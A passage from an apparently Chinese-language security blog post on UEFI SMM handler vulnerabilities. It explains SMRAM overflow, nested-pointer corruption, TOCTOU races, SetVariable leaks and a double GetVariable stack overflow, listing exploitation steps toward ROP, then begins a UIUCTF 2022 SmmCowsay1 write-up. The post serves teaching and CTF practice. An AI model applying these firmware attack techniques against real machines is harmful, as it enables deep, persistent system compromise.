class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">BOOLEAN</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmIsBufferOutsideSmmValid</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_PHYSICAL_ADDRESS  Buffer,</span></span><br><span class="line"><span class="params">  IN UINT64                Length</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  UINTN  Index;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check override.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> (B:0-&gt;L:4G) is invalid for IA32, but (B:1-&gt;L:4G-1)/(B:4G-1-&gt;L:1) is valid.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> ((Length &gt; mSmmMemLibInternalMaximumSupportAddress) ||</span><br><span class="line">      (Buffer &gt; mSmmMemLibInternalMaximumSupportAddress) ||</span><br><span class="line">      ((Length != <span class="number">0</span>) &amp;&amp; (Buffer &gt; (mSmmMemLibInternalMaximumSupportAddress - (Length - <span class="number">1</span>)))))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Overflow happen</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DEBUG ((</span><br><span class="line">      DEBUG_ERROR,</span><br><span class="line">      <span class="string">&quot;SmmIsBufferOutsideSmmValid: Overflow: Buffer (0x%lx) - Length (0x%lx), MaximumSupportAddress (0x%lx)\n&quot;</span>,</span><br><span class="line">      Buffer,</span><br><span class="line">      Length,</span><br><span class="line">      mSmmMemLibInternalMaximumSupportAddress</span><br><span class="line">      ));</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibInternalSmramCount; Index++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((Buffer &gt;= mSmmMemLibInternalSmramRanges[Index].CpuStart) &amp;&amp; (Buffer &lt; mSmmMemLibInternalSmramRanges[Index].CpuStart + mSmmMemLibInternalSmramRanges[Index].PhysicalSize)) ||</span><br><span class="line">        ((mSmmMemLibInternalSmramRanges[Index].CpuStart &gt;= Buffer) &amp;&amp; (mSmmMemLibInternalSmramRanges[Index].CpuStart &lt; Buffer + Length)))</span><br><span class="line">    &#123;</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;SmmIsBufferOutsideSmmValid: Overlap: Buffer (0x%lx) - Length (0x%lx), &quot;</span>,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length</span><br><span class="line">        ));</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;CpuStart (0x%lx) - PhysicalSize (0x%lx)\n&quot;</span>,</span><br><span class="line">        mSmmMemLibInternalSmramRanges[Index].CpuStart,</span><br><span class="line">        mSmmMemLibInternalSmramRanges[Index].PhysicalSize</span><br><span class="line">        ));</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check override for Valid Communication Region</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (mSmmMemLibSmmReadyToLock) &#123;</span><br><span class="line">    EFI_MEMORY_DESCRIPTOR  *MemoryMap;</span><br><span class="line">    BOOLEAN                InValidCommunicationRegion;</span><br><span class="line"></span><br><span class="line">    InValidCommunicationRegion = FALSE;</span><br><span class="line">    MemoryMap                  = mMemoryMap;</span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mMemoryMapEntryCount; Index++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((Buffer &gt;= MemoryMap-&gt;PhysicalStart) &amp;&amp;</span><br><span class="line">          (Buffer + Length &lt;= MemoryMap-&gt;PhysicalStart + LShiftU64 (MemoryMap-&gt;NumberOfPages, EFI_PAGE_SHIFT)))</span><br><span class="line">      &#123;</span><br><span class="line">        InValidCommunicationRegion = TRUE;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      MemoryMap = NEXT_MEMORY_DESCRIPTOR (MemoryMap, mDescriptorSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!InValidCommunicationRegion) &#123;</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;SmmIsBufferOutsideSmmValid: Not in ValidCommunicationRegion: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length</span><br><span class="line">        ));</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check untested memory as invalid communication buffer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibGcdMemNumberOfDesc; Index++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((Buffer &gt;= mSmmMemLibGcdMemSpace[Index].BaseAddress) &amp;&amp; (Buffer &lt; mSmmMemLibGcdMemSpace[Index].BaseAddress + mSmmMemLibGcdMemSpace[Index].Length)) ||</span><br><span class="line">          ((mSmmMemLibGcdMemSpace[Index].BaseAddress &gt;= Buffer) &amp;&amp; (mSmmMemLibGcdMemSpace[Index].BaseAddress &lt; Buffer + Length)))</span><br><span class="line">      &#123;</span><br><span class="line">        DEBUG ((</span><br><span class="line">          DEBUG_ERROR,</span><br><span class="line">          <span class="string">&quot;SmmIsBufferOutsideSmmValid: In Untested Memory Region: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">          Buffer,</span><br><span class="line">          Length</span><br><span class="line">          ));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check UEFI runtime memory with EFI_MEMORY_RO as invalid communication buffer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (mSmmMemLibMemoryAttributesTable != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      EFI_MEMORY_DESCRIPTOR  *Entry;</span><br><span class="line"></span><br><span class="line">      Entry = (EFI_MEMORY_DESCRIPTOR *)(mSmmMemLibMemoryAttributesTable + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibMemoryAttributesTable-&gt;NumberOfEntries; Index++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((Entry-&gt;Type == EfiRuntimeServicesCode) || (Entry-&gt;Type == EfiRuntimeServicesData)) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((Entry-&gt;Attribute &amp; EFI_MEMORY_RO) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((Buffer &gt;= Entry-&gt;PhysicalStart) &amp;&amp; (Buffer &lt; Entry-&gt;PhysicalStart + LShiftU64 (Entry-&gt;NumberOfPages, EFI_PAGE_SHIFT))) ||</span><br><span class="line">                ((Entry-&gt;PhysicalStart &gt;= Buffer) &amp;&amp; (Entry-&gt;PhysicalStart &lt; Buffer + Length)))</span><br><span class="line">            &#123;</span><br><span class="line">              DEBUG ((</span><br><span class="line">                DEBUG_ERROR,</span><br><span class="line">                <span class="string">&quot;SmmIsBufferOutsideSmmValid: In RuntimeCode Region: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">                Buffer,</span><br><span class="line">                Length</span><br><span class="line">                ));</span><br><span class="line">              <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Entry = NEXT_MEMORY_DESCRIPTOR (Entry, mSmmMemLibMemoryAttributesTable-&gt;DescriptorSize);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时这个函数的设置也存在缺陷，那就是 SmmIsBufferOutsideSmmValid 只会检查 CommBuffer 是否和 SMRAM 重叠，不会检查写入 CommBuffer 的内容是否溢出 CommBuffer。举个例子就是假设 CommBuffer 定义时长度 10 byte，但是输入的 20 byte。SmmIsBufferOutsideSmmValid 函数会检查 CommBuffer 到 CommBuffer + 10 byte 的区域和 SMRAM 有无重叠，但是不会检查 CommBuffer 到 CommBuffer + 20 byte 的区域。所以 SMI 处理处理不当的话依然会造成低地址的 SMRAM 损坏。  </p><p>下面是一个具体的例子：  </p><img src="/2024/12/14/uefi/4.png" class="" title="我的图图呢">  <p>这段代码主要干了如下几件事情：<br>1、检测 CommBuffer 和 CommBufferSize 的完整性。<br>2、读取由 0x115 指定的特定于模型的寄存器的值并赋值给 v4。<br>3、将 v4 的值经过一系列运算得出一个 QWORD 类型的数据并赋值给 CommBuffer。  </p><p>我们不难想到，如果我们的 CommBuffer 的大小为 1，最后的赋值操作就会出现 7 字节的溢出。这里我们可以将 CommBuffer 申请的直接与 SMRAM 相邻，大小为一字节，最后赋值的时候就会出现溢出修改 SMRAM 的前 7 字节。  </p><img src="/2024/12/14/uefi/5.png" class="" title="我的图图呢">  <p>这类漏洞的修复方法也很简单，直接比较 CommBuffer 的大小与赋值的数据的大小即可。  </p><h4 id="Arbitrary-SMRAM-Corruption"><a href="#Arbitrary-SMRAM-Corruption" class="headerlink" title="Arbitrary SMRAM Corruption"></a>Arbitrary SMRAM Corruption</h4><p>如果没使用 SmmIsBufferOutsideSmmValid 函数对多级指针指向的地址空间做检查，且 SMI 处理程序中多级指针指向 SMRAM 内的地址空间，就可以造成任意 SMRAM 损坏。一个简单的例子如下：  </p><img src="/2024/12/14/uefi/6.png" class="" title="我的图图呢">  <p>此处通过判断 CommBuffer 的地址处的字节来进行 switch，如果当前字节不为 0、2、3 则执行 default 里的代码。default 的代码中将一个错误代码写入了 CommBuffer + 1 地址为首地址的指针所指向的值。可以看到这个赋值的地址并没有进行检测，如果我们可以控制 *(CommBuffer + 1) 为 SMRAM 的地址，我们就能够在 SMRAM 中写入这个错误代码，对其进行破坏。  </p><img src="/2024/12/14/uefi/7.png" class="" title="我的图图呢">  <p>修复方法：每次在使用多级指针进行赋值时使用 SmmIsBufferOutsideSmmValid 对多级指针指向的地址空间做检查即可。  </p><h4 id="TOCTOU-attacks"><a href="#TOCTOU-attacks" class="headerlink" title="TOCTOU attacks"></a>TOCTOU attacks</h4><p>TOCTOU 是 time-of-check-time-of-use 的缩写。<br>SMM 设计的时候没有考虑到并发性，没有锁，也把其他中断屏蔽了，自然而然的也存在条件竞争漏洞。<br>这玩意其实也非常好理解，以下面这段代码为例：  </p><img src="/2024/12/14/uefi/8.png" class="" title="我的图图呢">  <p>从中可以看出，该处理程序引用了一个嵌套指针，我们 field_18 在至少 3 个不同的位置对其进行了命名：<br>首先，从通信缓冲区中检索其值并将其保存到 SMRAM 中的局部变量中。<br>然后，SmmIsBufferOutsideSmmValid() 调用局部变量以确保它不与 SMRAM 重叠。<br>如果被认为是安全的，则从通信缓冲区重新读取嵌套指针，然后将其作为 CopyMem() 目标参数传递。<br>如前所述，没有任何保证可以保证从通信缓冲区连续读取必然会产生相同的值。这意味着攻击者可以使用指向 SMRAM 之外完全安全位置的指针发出此 SMI。<br>然而，在 SMI 验证嵌套指针之后，在再次获取之前，存在一个小小的机会窗口，这时候可以利用条件竞争使用 DMA 攻击将对应的 smm_field_18 的内存进行修改。被修改的指针很快就会被传递给 CopyMem()，攻击者可以让它指向他想要破坏的 SMRAM 中的地址。  </p><h4 id="SetVariable-Information-Disclosure"><a href="#SetVariable-Information-Disclosure" class="headerlink" title="SetVariable() Information Disclosure"></a>SetVariable() Information Disclosure</h4><p>众所周知，SMRAM 无法从 SMM 外部读取，这就是为什么固件有时会使用它来存储必须对外界隐藏的秘密。除此之外，泄露 SMRAM 的内容还可以帮助利用需要准确了解内存布局的其他漏洞。<br>当 SMM 代码尝试更新 NVRAM 变量的内容时，可能会发生 SMRAM 泄露。在 UEFI 中，更新 NVRAM 变量不是原子操作，而是由以下步骤组成的复合操作：  </p><ul><li>分配一个堆栈缓冲区来保存与变量相关的数据。  </li><li>使用 GetVariable() 函数将变量的内容读入堆栈缓冲区。  </li><li>对堆栈缓冲区执行所有必要的修改。  </li><li>使用 SetVariable() 函数将修改后的堆栈缓冲区写回 NVRAM。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Status = gRT-&gt;GetVariable (</span><br><span class="line">                <span class="string">L&quot;ExampleConfiguration&quot;</span>,                <span class="comment">// VariableName</span></span><br><span class="line">                &amp;gEfiExampleConfigurationVariableGuid,  <span class="comment">// VendorGuid</span></span><br><span class="line">                &amp;Attributes,                            <span class="comment">// Attributes</span></span><br><span class="line">                &amp;DataSize,                              <span class="comment">// DataSize</span></span><br><span class="line">                &amp;ExampleConfiguration                   <span class="comment">// Data</span></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">Status = gRT-&gt;SetVariable (</span><br><span class="line">                <span class="string">L&quot;ExampleConfiguration&quot;</span>,               <span class="comment">// VariableName</span></span><br><span class="line">                &amp;gEfiExampleConfigurationVariableGuid, <span class="comment">// VendorGuid</span></span><br><span class="line">                EFI_VARIABLE_NON_VOLATILE |</span><br><span class="line">                EFI_VARIABLE_BOOTSERVICE_ACCESS |</span><br><span class="line">                EFI_VARIABLE_RUNTIME_ACCESS,</span><br><span class="line">                                                       <span class="comment">// Attributes </span></span><br><span class="line">                <span class="keyword">sizeof</span> (EXAMPLE_CONFIGURATION),        <span class="comment">// DataSize</span></span><br><span class="line">                &amp;ExampleConfiguration                  <span class="comment">// Data</span></span><br><span class="line">                );                </span><br></pre></td></tr></table></figure><p>这两个函数的第四个参数是读取和写入的 nvram 变量的长度，如果 SetVariable 的第四个参数大于修改后的局部变量的长度，会将多余的数据写入nvram 变量造成信息泄露。  </p><p>当开发人员隐式假设变量的大小是不可变的时，就会出现问题。由于这个假设，他们完全忽略了 GetVariable() 读取的字节数，并在 SetVariable() 写入更新内容时传递硬编码的大小。  </p><p>攻击流程如下：<br>首先调用操作系统提供的API函数来截断变量(如SetFirmwareEnvironmentVariable)，然后触发SMI处理程序，处理程序将：<br>1、分配基于堆栈的缓冲区，默认未初始化，这意味着它保存了 SMM 中发生的之前函数调用的剩余内容，包括各种地址什么的内容。  </p><img src="/2024/12/14/uefi/9.png" class="" title="我的图图呢">  <p>2、调用 GetVariable 函数将变量的内容读入缓冲区。因为攻击者截断了 NVRAM 的变量，所以缓冲区肯定比变量的长度长。意味着它在 GetVariable 返回的时候仍然会带有一些未初始化的字节。  </p><img src="/2024/12/14/uefi/10.png" class="" title="我的图图呢">  <p>3、修改内存中的堆栈缓冲区。</p><img src="/2024/12/14/uefi/11.png" class="" title="我的图图呢">  <p>4、调用 SetVariable() 函数将修改后的堆栈缓冲区写回到 NVRAM。由于此调用是使用硬编码的恒定堆栈缓冲区大小完成的，因此它还会将其未初始化的部分写入 NVRAM。</p><img src="/2024/12/14/uefi/12.png" class="" title="我的图图呢">  <p>攻击者可以利用类似于 GetFirmwareEnvironmentVariable() 这一类函数来获取未初始化的内容进而泄露出有用的数据。</p><h4 id="Double-GetVariable"><a href="#Double-GetVariable" class="headerlink" title="Double GetVariable()"></a>Double GetVariable()</h4><p>下面的漏洞代码位于偏移量 0x7B68（固件名称：S05_02020000.bin，应用程序名称0138）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CheckBatterySafety</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_GUID VendorGuid;</span><br><span class="line">  <span class="type">char</span> Buffer;</span><br><span class="line">  UINTN DataSize;</span><br><span class="line"></span><br><span class="line">  VendorGuid.Data1 = <span class="number">0xFB3B9ECE</span>;</span><br><span class="line">  *&amp;VendorGuid.Data2 = <span class="number">0x49334ABA</span>;</span><br><span class="line">  *VendorGuid.Data4 = <span class="number">0xD6B49DB4</span>;</span><br><span class="line">  *&amp;VendorGuid.Data4[<span class="number">4</span>] = <span class="number">0x5123897D</span>;</span><br><span class="line">  Buffer = <span class="number">0</span>;</span><br><span class="line">  DataSize = <span class="number">1</span>i64;</span><br><span class="line">  <span class="keyword">return</span> (!gRT_157B30-&gt;GetVariable(<span class="string">L&quot;BatterySafetyModeStatus&quot;</span>, &amp;VendorGuid, <span class="number">0</span>i64, &amp;DataSize, &amp;Buffer)</span><br><span class="line">       || !gRT_157B30-&gt;GetVariable(<span class="string">L&quot;BatterySafetyMode&quot;</span>, &amp;VendorGuid, <span class="number">0</span>i64, &amp;DataSize, &amp;Buffer))</span><br><span class="line">      &amp;&amp; Buffer == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 NVRAM 变量 BatterySafetyModeStatus 的长度大于 1，则将 DataSize 设置为 BatterySafetyModeStatus 变量的长度，并第二次调用 GetVariable 服务。<br>第二次调用 GetVariable 服务后，NVRAM 变量 BatterySafetyMode 的值将写入 Buffer 堆栈变量。<br>通过控制 BatterySafetyModeStatus 和 BatterySafetyMode 变量的值，我们可以将任何数据写入堆栈，从而在堆栈上执行任意代码。<br>利用步骤：<br>1、更改 BatterySafetyModeStatus 和 BatterySafetyMode 变量。<br>2、通过更改 BatterySafetyModeStatus 变量的值，我们在第二次调用 GetVariable 之前更改 DataSize 的值。<br>3、通过更改 BatterySafetyMode 变量的值，我们可以溢出堆栈并在堆栈上执行任意代码（ROP）。  </p><h2 id="通过一些题目进行练习"><a href="#通过一些题目进行练习" class="headerlink" title="通过一些题目进行练习"></a>通过一些题目进行练习</h2><p>其实我是想直接分析并利用 CVE，毕竟这更加接近 RealWorld。可无奈于 CTF 题目太适合入门了🥹  </p><h3 id="UIUCTF-2022-SmmCowsay1"><a href="#UIUCTF-2022-SmmCowsay1" class="headerlink" title="UIUCTF 2022 SmmCowsay1"></a>UIUCTF 2022 SmmCowsay1</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目描述：  </p><blockquote><p>One of our engineers thought it would be a good idea to write Cowsay inside SMM. Then someone outside read out the trade secret (a.k.a. flag) stored at physical address 0x44440000, and since it could only be read from SMM, that can only mean one thing: it… was a horrible idea.  </p></blockquote><p>题目附件文件结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">cow/</span><br><span class="line">├── README</span><br><span class="line">├── chal_build</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   ├── handout-readme</span><br><span class="line">│   ├── handout_run.sh</span><br><span class="line">│   └── patches</span><br><span class="line">│       ├── edk2</span><br><span class="line">│       │   ├── 0001-PiSmmCore-Fix-for-CVE-2021-38578-integer-underflow.patch</span><br><span class="line">│       │   ├── 0002-ShellPkg-Simplify-Shell.patch</span><br><span class="line">│       │   ├── 0003-SmmCowsay-Vulnerable-Cowsay.patch</span><br><span class="line">│       │   ├── 0004-Add-UEFI-Binexec.patch</span><br><span class="line">│       │   └── 0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</span><br><span class="line">│       └── qemu</span><br><span class="line">│           └── 0001-Implement-UIUCTFMMIO-device.patch</span><br><span class="line">├── edk2_artifacts</span><br><span class="line">│   ├── AcpiTableDxe.debug</span><br><span class="line">│   ├── AcpiTableDxe.efi</span><br><span class="line">│   ├── AmdSevDxe.debug</span><br><span class="line">│   ├── AmdSevDxe.efi</span><br><span class="line">│   ├── ArpDxe.debug</span><br><span class="line">|   ..................</span><br><span class="line">│   ├── httpDynamicCommand.efi</span><br><span class="line">│   ├── tftpDynamicCommand.debug</span><br><span class="line">│   └── tftpDynamicCommand.efi</span><br><span class="line">├── edk2debug.log</span><br><span class="line">└── run</span><br><span class="line">    ├── OVMF_CODE.fd</span><br><span class="line">    ├── OVMF_VARS.fd</span><br><span class="line">    ├── OVMF_VARS_copy.fd</span><br><span class="line">    ├── kvmvapic.bin</span><br><span class="line">    ├── qemu-system-x86_64</span><br><span class="line">    ├── region4</span><br><span class="line">    ├── rootfs</span><br><span class="line">    │   ├── binexec.efi</span><br><span class="line">    │   └── startup.nsh</span><br><span class="line">    └── run.sh</span><br></pre></td></tr></table></figure><p>运行 run 目录下的 run.sh 即可启动题目，题目运行效果如下：  </p><img src="/2024/12/14/uefi/14.png" class="" title="我的图图呢">  <p>可以看到题目的意思就是执行我们输入的 amd64 shellcode，我们简单验证一下  </p><p>生成 shellcode  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or4nge@localhost:~$ pwn asm -c amd64 <span class="string">&quot;mov rax, 0xdeadbeafdeadbeaf&quot;</span></span><br><span class="line">48b8afbeaddeafbeadde</span><br></pre></td></tr></table></figure><p>运行结果如下：  </p><img src="/2024/12/14/uefi/15.png" class="" title="我的图图呢">  <p>可以看到 rax 寄存器的值已经被改变  </p><p>而我们的 shellcode 是在 SMRAM 外面运行的，能够做的事情非常有限，所以我们需要利用漏洞来获取更高的执行权限或者读取需要高权限才能获取的内容。   </p><p>chal_build 目录里给出了多个 patch 文件，按理来说漏洞应该就会出现在这个地方。由于有 patch 文件，所以我们就不需要用 ida 对固件进行逆向，直接阅读源码即可。  </p><p>首先看 SmmCowsay-Vulnerable-Cowsay.patch 文件，从名字来看就感觉这个文件非常的重要。<br>首先看最下方的 inf 文件:  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">+++ b/OvmfPkg/SmmCowsay/SmmCowsay.inf</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,38 @@</span></span><br><span class="line"><span class="addition">+[Defines]</span></span><br><span class="line"><span class="addition">+  INF_VERSION                    = 0x00010005</span></span><br><span class="line"><span class="addition">+  BASE_NAME                      = SmmCowsay</span></span><br><span class="line"><span class="addition">+  FILE_GUID                      = A7DE70E0-918E-4DFE-BFFB-AD860A376E65</span></span><br><span class="line"><span class="addition">+  MODULE_TYPE                    = DXE_SMM_DRIVER</span></span><br><span class="line"><span class="addition">+  VERSION_STRING                 = 1.0</span></span><br><span class="line"><span class="addition">+  PI_SPECIFICATION_VERSION       = 0x0001000A</span></span><br><span class="line"><span class="addition">+  ENTRY_POINT                    = SmmCowsayInit</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+[Sources]</span></span><br><span class="line"><span class="addition">+  SmmCowsay.c</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure><p>用 gpt 的话来说，INF 文件是用于描述模块（例如驱动程序）的元数据，以及如何构建和安装模块的指令。</p><ul><li></li><li>INF_VERSION: INF 文件的版本号。0x00010005 是十六进制表示的版本号。</li><li>BASE_NAME: 模块的基名称，这里是 SmmCowsay。</li><li>FILE_GUID: 一个全局唯一标识符（GUID），用于唯一标识这个 INF 文件。A7DE70E0-918E-4DFE-BFFB-AD860A376E65 是这个 INF 文件的特定 GUID。</li><li>MODULE_TYPE: 指定模块的类型。DXE_SMM_DRIVER 表示这是一个 DXE 阶段的系统管理模块（SMM）驱动程序。</li><li>VERSION_STRING: 模块的版本字符串，这里是 1.0。</li><li>PI_SPECIFICATION_VERSION: 指定模块遵循的 UEFI 固件规格版本。0x0001000A 是十六进制表示的版本号。</li><li>ENTRY_POINT: 模块的入口点函数名，这里是 SmmCowsayInit，这意味着当模块被加载时，UEFI 固件将调用这个函数。</li></ul><p>注册处理程序的代码就在当前文件的 ENTRY_POINT 中：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+SmmCowsayInit (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="addition">+  IN EFI_SYSTEM_TABLE *SystemTable</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_STATUS Status;</span></span><br><span class="line"><span class="addition">+  EFI_HANDLE DispatchHandle;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Status = gSmst-&gt;SmiHandlerRegister (</span></span><br><span class="line"><span class="addition">+                    SmmCowsayHandler,</span></span><br><span class="line"><span class="addition">+                    &amp;gEfiSmmCowsayCommunicationGuid,</span></span><br><span class="line"><span class="addition">+                    &amp;DispatchHandle</span></span><br><span class="line"><span class="addition">+                    );</span></span><br><span class="line"><span class="addition">+  ASSERT_EFI_ERROR (Status);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return Status;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>SmiHandlerRegister 函数的参数如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmiHandlerRegister (</span><br><span class="line">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="line">  IN  